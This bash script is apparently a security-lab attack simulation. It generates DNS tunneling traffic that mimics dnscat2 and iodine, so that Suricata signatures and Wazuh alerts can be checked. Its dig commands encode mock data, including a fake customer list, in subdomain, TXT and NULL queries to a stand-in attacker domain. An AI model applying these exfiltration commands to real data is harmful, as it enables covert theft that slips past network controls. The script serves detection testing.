#!/bin/bash
# Attack Simulation 04 — DNS Tunneling Exfiltration
# MITRE ATT&CK: T1048.003 — Exfiltration Over Alternative Protocol: DNS
# Attacker: Kali (10.10.10.20) simulating an agent inside the lab
# Concept:  Encodes data in DNS subdomain queries (mimics dnscat2/iodine)
# Expected Suricata SID: 9001007 (long subdomain), 9001008 (beacon frequency)
# Expected Wazuh alert:  rule group "suricata" — trojan-activity classtype

set -euo pipefail

LOG_DIR="/tmp/attack-logs"
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
DNS_SERVER="8.8.8.8"  # Lab: use host DNS resolver
C2_DOMAIN="exfil.lab.attacker.local"

echo "============================================================"
echo "  ATTACK 04 — DNS Tunneling Exfiltration (T1048.003)"
echo "  Technique: long-label DNS subdomain encoding"
echo "  Time: $(date)"
echo "============================================================"

# Phase 1: Simulate dnscat2 beacon — high-frequency DNS queries
echo "[+] Phase 1: High-frequency DNS queries (mimics dnscat2 beacon)"
for i in $(seq 1 15); do
    # Each query encodes 4 bytes of mock data in base32 subdomain
    PAYLOAD=$(head -c 32 /dev/urandom | base64 | tr '+/' 'AB' | tr -d '=' | head -c 48)
    dig +short +time=1 "${PAYLOAD}.${C2_DOMAIN}" @"$DNS_SERVER" A \
        >> "$LOG_DIR/04a-dns-beacon-$TIMESTAMP.txt" 2>&1 &
    sleep 0.3
done
wait
echo "[*] Sent 15 DNS beacon queries — check for SID 9001007, 9001008"

sleep 2

# Phase 2: Simulate large TXT record exfil query (encodes mock file data)
echo "[+] Phase 2: DNS TXT record data exfiltration simulation"
FAKE_PAYLOAD=$(echo "EXFIL:customer_data:Alice,Bob,Carol" | base64 | \
    tr '+/' 'AB' | tr -d '=')
dig +short +time=2 "txt.${FAKE_PAYLOAD:0:50}.exfil.${C2_DOMAIN}" \
    @"$DNS_SERVER" TXT \
    2>&1 | tee "$LOG_DIR/04b-dns-txt-$TIMESTAMP.txt"
echo "[*] TXT record query with 50+ char label sent"

sleep 2

# Phase 3: Simulate iodine-style NULL record tunnel
echo "[+] Phase 3: NULL record tunnel simulation (iodine pattern)"
for i in $(seq 1 5); do
    CHUNK=$(head -c 20 /dev/urandom | xxd -p | head -c 40)
    dig +short +time=1 "null.${CHUNK}.tunnel.${C2_DOMAIN}" \
        @"$DNS_SERVER" NULL \
        >> "$LOG_DIR/04c-dns-null-$TIMESTAMP.txt" 2>&1 || true
    sleep 0.5
done
echo "[*] NULL record queries sent"

echo ""
echo "[RESULTS] Output saved to $LOG_DIR/"
echo "[EXPECTED DETECTIONS]"
echo "  Suricata SID 9001007 — long subdomain label (50+ chars) regex match"
echo "  Suricata SID 9001008 — DNS query threshold from same src (10+ in 10s)"
echo "  EVE JSON event_type: alert, classtype: trojan-activity"
echo "  Wazuh dashboard: Security Alerts > trojan-activity"
echo "NOTE: DNS egress must be permitted from attacker zone for queries to reach"
echo "      the network bridge. VyOS does not block UDP/53 from DMZ by default."
echo "============================================================"
